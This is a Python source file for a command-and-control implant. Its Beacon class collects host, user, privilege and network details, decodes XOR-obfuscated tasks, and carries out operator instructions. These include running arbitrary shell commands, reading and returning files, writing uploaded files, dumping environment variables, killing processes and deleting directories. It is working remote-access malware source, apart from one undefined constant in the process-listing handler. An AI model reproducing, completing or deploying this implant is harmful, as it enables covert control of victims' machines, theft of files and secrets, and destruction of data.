import json
import base64
import random
import socket
import os
import platform
import shutil
import subprocess
from pathlib import Path
from typing import Callable, Dict, List, Tuple


CHARACTER_POOL = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

COMMAND_WHOAMI = "whoami"

# Instruction identifiers
INSTRUCTION_LS = "ls"
INSTRUCTION_PS = "ps"
INSTRUCTION_CD = "cd"
INSTRUCTION_PWD = "pwd"
INSTRUCTION_CAT = "cat"
INSTRUCTION_DOWNLOAD = "download"
INSTRUCTION_UPLOAD = "upload"
INSTRUCTION_RUN = "run"
INSTRUCTION_SLEEP = "sleep"
INSTRUCTION_END = "end"

# Miscellaneous command strings
DEFAULT_LIST_DIRECTORY = "."
FILE_TYPE_FILE = "f"
FILE_TYPE_DIRECTORY = "d"
UNKNOWN_OWNER = "unknown"
UNKNOWN_GROUP = "unknown"
PERMISSION_SLICE_START = -3

# Platform specific process listing commands
PS_COMMAND_LINUX = "ps -aux"
PS_COMMAND_WINDOWS = "tasklist"
WINDOWS_PLATFORM_PREFIX = "win"

SLEEP_SECONDS_TO_MILLISECONDS = 1000

# Beacon bundle keys
BUNDLE_KEY_BEACON_HASH = "BH"
BUNDLE_KEY_LISTENER_HASH = "LH"
BUNDLE_KEY_USERNAME = "UN"
BUNDLE_KEY_HOSTNAME = "HN"
BUNDLE_KEY_ARCH = "ARC"
BUNDLE_KEY_PRIVILEGE = "PR"
BUNDLE_KEY_OS = "OS"
BUNDLE_KEY_POF = "POF"
BUNDLE_KEY_INTERNAL_IPS = "IIPS"
BUNDLE_KEY_PROCESS_ID = "PID"
BUNDLE_KEY_ADDITIONAL_INFO = "ADI"
BUNDLE_KEY_SESSIONS = "SS"

# Session/message keys
MSG_KEY_INSTRUCTION = "INS"
MSG_KEY_COMMAND = "CM"
MSG_KEY_ARGS = "AR"
MSG_KEY_DATA = "DA"
MSG_KEY_INPUT_FILE = "IF"
MSG_KEY_OUTPUT_FILE = "OF"
MSG_KEY_PID = "PI"
MSG_KEY_ERROR_CODE = "EC"
MSG_KEY_UUID = "UID"
MSG_KEY_RETURN_VALUE = "RV"

DEFAULT_INTERNAL_IP_SEPARATOR = "\n"
DEFAULT_USERNAME = "user"
ROOT_USERNAME = "root"
DEFAULT_PRIVILEGE_ROOT = "high"
DEFAULT_PRIVILEGE_STANDARD = "low"
DEFAULT_DOWNLOAD_SUCCESS = "File downloaded"
DEFAULT_DOWNLOAD_FAILURE = "Download failed"
DEFAULT_UPLOAD_SUCCESS = "File uploaded."
DEFAULT_UPLOAD_FAILURE = "Upload failed."
DEFAULT_EMPTY_RESPONSE = "Empty response."
DEFAULT_UNKNOWN_COMMAND = "cmd unknown."
ERROR_NO_SUCH_FILE_PREFIX = "No such file or directory: "


def xor_bytes(data: bytes, key: str) -> bytes:
    """XOR the provided bytes using the supplied key."""
    if not key:
        return data

    key_bytes = key.encode("utf-8")
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))


def xorEncode(text, key):
    """Backwards compatible helper that XOR encodes text using *key*."""
    if isinstance(text, str):
        data = text.encode("utf-8")
        return xor_bytes(data, key).decode("utf-8", errors="ignore")
    return xor_bytes(text, key)


class Beacon:
        
    def __init__(self):
        self.beaconHash = ""
        self.hostname = ""
        self.username = ""
        self.arch = ""
        self.privilege = ""
        self.os = ""
        self.sleepTimeMs = SLEEP_SECONDS_TO_MILLISECONDS

        self.tasks: List[Dict[str, object]] = []
        self.taskResults: List[Dict[str, object]] = []

        self._instruction_handlers: Dict[str, Callable[[str, str, bytes, str, str, int], Tuple[str, bytes]]] = {}

        self.beaconHash = ''.join(random.choice(CHARACTER_POOL) for _ in range(32))

        self.hostname = socket.gethostname()
        self.username = DEFAULT_USERNAME
        try:
            self.username = os.getlogin()
        except:
            self.username = subprocess.run(
                COMMAND_WHOAMI,
                shell=True,
                stderr=subprocess.STDOUT,
                stdout=subprocess.PIPE,
            ).stdout.decode("utf-8")
        self.arch = platform.machine()
        if self.username == ROOT_USERNAME:
            self.privilege = DEFAULT_PRIVILEGE_ROOT
        else:
            self.privilege = DEFAULT_PRIVILEGE_STANDARD
        self.os = platform.system()
        self.listenerHash = ""
        self.internalIps = self._collect_internal_ips()
        self.processId = str(os.getpid())
        self.additionalInfo = ""
        self.xorKey = ""

        self._register_instruction_handlers()


    def set_xor_key(self, key: str) -> None:
        self.xorKey = key or ""

    def _register_instruction_handlers(self) -> None:
        handlers = {
            "loadmodule": self._handle_load_module,
            "change_directory": self._handle_change_directory,
            "changedirectory": self._handle_change_directory,
            "cd": self._handle_change_directory,
            "download": self._handle_download,
            "upload": self._handle_upload,
            "listdirectory": self._handle_list_directory,
            "ls": self._handle_list_directory,
            "dir": self._handle_list_directory,
            "listprocesses": self._handle_list_processes,
            "ps": self._handle_list_processes,
            "powershell": self._handle_powershell,
            "printworkingdirectory": self._handle_pwd,
            "pwd": self._handle_pwd,
            "run": self._handle_run,
            "shell": self._handle_shell,
            "cat": self._handle_cat,
            "mkdir": self._handle_mkdir,
            "remove": self._handle_remove,
            "rm": self._handle_remove,
            "killprocess": self._handle_kill_process,
            "tree": self._handle_tree,
            "getenv": self._handle_getenv,
            "whoami": self._handle_whoami,
            "netstat": self._handle_netstat,
            "ipconfig": self._handle_ipconfig,
            "enumerateshares": self._handle_enumerate_shares,
        }

        self._instruction_handlers = handlers

    def _collect_internal_ips(self) -> str:
        ips: List[str] = []
        try:
            host_info = socket.gethostbyname_ex(socket.gethostname())
            for ip in host_info[2]:
                if not ip.startswith("127.") and ip not in ips:
                    ips.append(ip)
        except Exception:
            pass
        return DEFAULT_INTERNAL_IP_SEPARATOR.join(ips)

    def _decode_c2_message(self, message: Dict[str, object]) -> Dict[str, object]:
        instruction = message.get(MSG_KEY_INSTRUCTION, "")
        if not isinstance(instruction, str):
            instruction = str(instruction)

        cmd = message.get(MSG_KEY_COMMAND, "")
        if not isinstance(cmd, str):
            cmd = str(cmd)

        args = message.get(MSG_KEY_ARGS, "")
        if not isinstance(args, str):
            args = str(args)
        pid = message.get(MSG_KEY_PID, -1)
        error_code = message.get(MSG_KEY_ERROR_CODE, -1)
        uuid = message.get(MSG_KEY_UUID, "")
        if not isinstance(uuid, str):
            uuid = str(uuid)

        def _decode_b64(key: str, default: str = "") -> str:
            value = message.get(key, "")
            if not isinstance(value, str) or value == "":
                return default
            try:
                return base64.b64decode(value.encode("utf-8")).decode("utf-8", errors="ignore")
            except Exception:
                return default

        input_file = _decode_b64(MSG_KEY_INPUT_FILE)
        output_file = _decode_b64(MSG_KEY_OUTPUT_FILE)
        return_value = _decode_b64(MSG_KEY_RETURN_VALUE)

        data = message.get(MSG_KEY_DATA, "")
        if isinstance(data, str) and data:
            try:
                data_bytes = base64.b64decode(data.encode("utf-8"))
            except Exception:
                data_bytes = b""
        else:
            data_bytes = b""

        try:
            pid = int(pid)
        except Exception:
            pid = -1

        try:
            error_code = int(error_code)
        except Exception:
            error_code = -1

        return {
            "instruction": instruction,
            "cmd": cmd,
            "args": args,
            "data": data_bytes,
            "inputFile": input_file,
            "outputFile": output_file,
            "pid": pid,
            "errorCode": error_code,
            "uuid": uuid,
            "returnValue": return_value,
        }

    def cmdToTasks(self, input_data: str) -> None:
        if not input_data.strip():
            return

        try:
            decoded = base64.b64decode(input_data.encode("utf-8"))
        except Exception:
            return

        decrypted_bytes = xor_bytes(decoded, self.xorKey)
        try:
            bundles = json.loads(decrypted_bytes.decode("utf-8", errors="ignore"))
        except Exception:
            return

        for bundle in bundles:
            if not isinstance(bundle, dict):
                continue
            beacon_hash = bundle.get(BUNDLE_KEY_BEACON_HASH, "")
            if beacon_hash != self.beaconHash:
                continue

            sessions = bundle.get(BUNDLE_KEY_SESSIONS, [])
            if not isinstance(sessions, list):
                continue

            for session in sessions:
                if not isinstance(session, dict):
                    continue
                task = self._decode_c2_message(session)
                if task.get("instruction"):
                    self.tasks.append(task)

    def _encode_c2_message(self, message: Dict[str, object]) -> Dict[str, object]:
        encoded: Dict[str, object] = {}

        def _encode_b64(value: str) -> str:
            if not value:
                return ""
            return base64.b64encode(value.encode("utf-8")).decode("utf-8")

        instruction = message.get("instruction", "")
        cmd = message.get("cmd", "")
        args = message.get("args", "")
        return_value = message.get("returnValue", "")
        input_file = message.get("inputFile", "")
        output_file = message.get("outputFile", "")
        data = message.get("data", b"")
        pid = message.get("pid", -1)
        error_code = message.get("errorCode", -1)
        uuid = message.get("uuid", "")

        if instruction:
            encoded[MSG_KEY_INSTRUCTION] = instruction
        if cmd:
            encoded[MSG_KEY_COMMAND] = cmd
        if return_value:
            encoded[MSG_KEY_RETURN_VALUE] = _encode_b64(str(return_value))
        if input_file:
            encoded[MSG_KEY_INPUT_FILE] = _encode_b64(str(input_file))
        if output_file:
            encoded[MSG_KEY_OUTPUT_FILE] = _encode_b64(str(output_file))
        if data:
            if isinstance(data, str):
                data_bytes = data.encode("utf-8")
            else:
                data_bytes = data
            encoded[MSG_KEY_DATA] = base64.b64encode(data_bytes).decode("utf-8")
        if args:
            encoded[MSG_KEY_ARGS] = str(args)
        if isinstance(pid, int) and pid != -1:
            encoded[MSG_KEY_PID] = pid
        if isinstance(error_code, int) and error_code != -1:
            encoded[MSG_KEY_ERROR_CODE] = error_code
        if uuid:
            encoded[MSG_KEY_UUID] = str(uuid)

        return encoded

    def serialize_task_results(self) -> str:
        bundle: Dict[str, object] = {}

        if self.beaconHash:
            bundle[BUNDLE_KEY_BEACON_HASH] = self.beaconHash
        if self.listenerHash:
            bundle[BUNDLE_KEY_LISTENER_HASH] = self.listenerHash
        if self.username:
            bundle[BUNDLE_KEY_USERNAME] = self.username
        if self.hostname:
            bundle[BUNDLE_KEY_HOSTNAME] = self.hostname
        if self.arch:
            bundle[BUNDLE_KEY_ARCH] = self.arch
        if self.privilege:
            bundle[BUNDLE_KEY_PRIVILEGE] = self.privilege
        if self.os:
            bundle[BUNDLE_KEY_OS] = self.os
        bundle[BUNDLE_KEY_POF] = "0"
        if self.internalIps:
            bundle[BUNDLE_KEY_INTERNAL_IPS] = self.internalIps
        if self.processId:
            bundle[BUNDLE_KEY_PROCESS_ID] = str(self.processId)
        if self.additionalInfo:
            bundle[BUNDLE_KEY_ADDITIONAL_INFO] = self.additionalInfo

        sessions: List[Dict[str, object]] = []
        for result in self.taskResults:
            sessions.append(self._encode_c2_message(result))
        if sessions:
            bundle[BUNDLE_KEY_SESSIONS] = sessions

        serialized = json.dumps([bundle], separators=(",", ":"))
        encrypted = xor_bytes(serialized.encode("utf-8"), self.xorKey)

        self.taskResults.clear()

        return base64.b64encode(encrypted).decode("utf-8")

    def execInstruction(self):
        for it in self.tasks:
            instruction = it.get("instruction", "")
            args = it.get("args", "")
            cmd = it.get("cmd", "")
            data = it.get("data", b"")
            inputFile = it.get("inputFile", "")
            outputFile = it.get("outputFile", "")
            pid = it.get("pid", -1)
            uuid = it.get("uuid", "")

            if isinstance(data, str):
                data = data.encode("utf-8")

            result = ""

            handler = self._instruction_handlers.get(str(instruction).lower())

            if handler:
                try:
                    handler_result, data = handler(cmd, args, data, inputFile, outputFile, pid)
                    result = handler_result
                except Exception:
                    result = DEFAULT_UNKNOWN_COMMAND
                    data = b""

            elif instruction == INSTRUCTION_SLEEP:
                self.sleepTimeMs=int(cmd)*SLEEP_SECONDS_TO_MILLISECONDS
                result = cmd

            elif instruction == INSTRUCTION_END:
                exit(0)

            else:
                result = DEFAULT_UNKNOWN_COMMAND

            if not isinstance(result, str):
                result = str(result)

            taskResult = {
                "args":args,
                "cmd":cmd,
                "data":data,
                "inputFile":inputFile,
                "instruction":instruction,
                "outputFile":outputFile,
                "pid":pid,
                "returnValue":result,
                "errorCode":it.get("errorCode", -1),
                "uuid":uuid,
                }
            self.taskResults.append(taskResult)

        # cleaning
        self.tasks.clear()

    def _handle_load_module(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        return ("Load Module is not required for this implant.", b"")

    def _handle_change_directory(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        target = cmd or args or input_file or "."
        try:
            os.chdir(target)
            return (os.getcwd(), b"")
        except Exception as exc:
            return (f"Failed to change directory: {exc}", b"")

    def _handle_download(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        path = input_file or cmd or args
        if not path:
            return (DEFAULT_DOWNLOAD_FAILURE, b"")
        try:
            with open(path, "rb") as fh:
                file_data = fh.read()
            return (DEFAULT_DOWNLOAD_SUCCESS, file_data)
        except Exception:
            return (DEFAULT_DOWNLOAD_FAILURE, b"")

    def _handle_upload(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        path = output_file or cmd or args
        if not path:
            return (DEFAULT_UPLOAD_FAILURE, data)
        try:
            with open(path, "wb") as fh:
                fh.write(data)
            return (DEFAULT_UPLOAD_SUCCESS, b"")
        except Exception:
            return (DEFAULT_UPLOAD_FAILURE, data)

    def _handle_list_directory(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        directory = cmd or args or input_file or "."
        try:
            entries = os.listdir(directory)
        except Exception:
            return (ERROR_NO_SUCH_FILE_PREFIX + directory, b"")

        lines: List[str] = []
        for entry in sorted(entries):
            full_path = os.path.join(directory, entry)
            try:
                mode = oct(os.stat(full_path).st_mode)[-3:]
                path_obj = Path(full_path)
                owner = path_obj.owner()
                group = path_obj.group()
            except Exception:
                mode = "---"
                owner = "unknown"
                group = "unknown"
            entry_type = "d" if os.path.isdir(full_path) else "f"
            lines.append(f"{entry_type}{mode} {owner} {group} {full_path}")

        return ("\n".join(lines), b"")

    def _handle_list_processes(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        try:
            completed = subprocess.run(
                [PS_COMMAND],
                shell=True,
                stderr=subprocess.STDOUT,
                stdout=subprocess.PIPE,
                timeout=30,
            )
            output = completed.stdout.decode("utf-8", errors="ignore")
            return (output or DEFAULT_EMPTY_RESPONSE, b"")
        except Exception as exc:
            return (f"Failed to list processes: {exc}", b"")

    def _handle_powershell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        return ("Powershell command execution is not supported on this platform.", b"")

    def _handle_pwd(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        return (os.getcwd(), b"")

    def _handle_run(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        command = cmd or args
        if not command:
            return (DEFAULT_EMPTY_RESPONSE, b"")
        try:
            completed = subprocess.run(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                stdout=subprocess.PIPE,
                timeout=60,
            )
            output = completed.stdout.decode("utf-8", errors="ignore")
            return (output or DEFAULT_EMPTY_RESPONSE, b"")
        except Exception as exc:
            return (f"Failed to execute command: {exc}", b"")

    def _handle_shell(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        return self._handle_run(cmd, args, data, input_file, output_file, pid)

    def _handle_cat(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        path = input_file or cmd or args
        if not path:
            return (ERROR_NO_SUCH_FILE_PREFIX + path, b"") if path else ("No file specified.", b"")
        try:
            with open(path, "rb") as fh:
                contents = fh.read()
            return (contents.decode("utf-8", errors="ignore"), b"")
        except Exception:
            return (ERROR_NO_SUCH_FILE_PREFIX + path, b"")

    def _handle_mkdir(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        directory = cmd or args or input_file
        if not directory:
            return ("No directory specified.", b"")
        try:
            os.makedirs(directory, exist_ok=True)
            return (f"Directory created: {directory}", b"")
        except Exception as exc:
            return (f"Failed to create directory: {exc}", b"")

    def _handle_remove(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        target = cmd or args or input_file
        if not target:
            return ("No path specified.", b"")
        try:
            if os.path.isdir(target) and not os.path.islink(target):
                shutil.rmtree(target)
            else:
                os.remove(target)
            return (f"Removed: {target}", b"")
        except FileNotFoundError:
            return (ERROR_NO_SUCH_FILE_PREFIX + target, b"")
        except Exception as exc:
            return (f"Failed to remove {target}: {exc}", b"")

    def _handle_kill_process(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        pid_str = cmd or args or str(pid)
        try:
            process_id = int(pid_str)
        except Exception:
            return (f"Invalid PID: {pid_str}", b"")
        try:
            os.kill(process_id, 9)
            return (f"Process {process_id} terminated.", b"")
        except Exception as exc:
            return (f"Failed to terminate process {process_id}: {exc}", b"")

    def _handle_tree(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        base_path = cmd or args or input_file or "."
        if not os.path.exists(base_path):
            return (ERROR_NO_SUCH_FILE_PREFIX + base_path, b"")

        lines: List[str] = []
        base_path = os.path.abspath(base_path)
        for root_dir, dirs, files in os.walk(base_path):
            dirs.sort()
            rel_path = os.path.relpath(root_dir, base_path)
            level = 0 if rel_path == "." else rel_path.count(os.sep) + 1
            indent = "    " * level
            name = Path(root_dir).name if rel_path != "." else Path(base_path).name
            lines.append(f"{indent}{name}/")
            for fname in sorted(files):
                lines.append(f"{indent}    {fname}")
        return ("\n".join(lines), b"")

    def _handle_getenv(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        key = cmd or args or input_file
        if key:
            return (os.environ.get(key, ""), b"")
        env_dump = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))
        return (env_dump, b"")

    def _handle_whoami(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        try:
            completed = subprocess.run(
                ["whoami"],
                shell=False,
                stderr=subprocess.STDOUT,
                stdout=subprocess.PIPE,
                timeout=10,
            )
            output = completed.stdout.decode("utf-8", errors="ignore").strip()
            if output:
                return (output, b"")
        except Exception:
            pass
        return (self.username or DEFAULT_USERNAME, b"")

    def _handle_netstat(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        commands = ["netstat -an", "ss -an"]
        for command in commands:
            try:
                completed = subprocess.run(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    stdout=subprocess.PIPE,
                    timeout=60,
                )
                output = completed.stdout.decode("utf-8", errors="ignore")
                if output:
                    return (output, b"")
            except Exception:
                continue
        return (DEFAULT_EMPTY_RESPONSE, b"")

    def _handle_ipconfig(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        commands = ["ip addr show", "ifconfig"]
        for command in commands:
            try:
                completed = subprocess.run(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    stdout=subprocess.PIPE,
                    timeout=60,
                )
                output = completed.stdout.decode("utf-8", errors="ignore")
                if output:
                    return (output, b"")
            except Exception:
                continue
        return (DEFAULT_EMPTY_RESPONSE, b"")

    def _handle_enumerate_shares(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
        return ("Share enumeration is not supported on this implant.", b"")
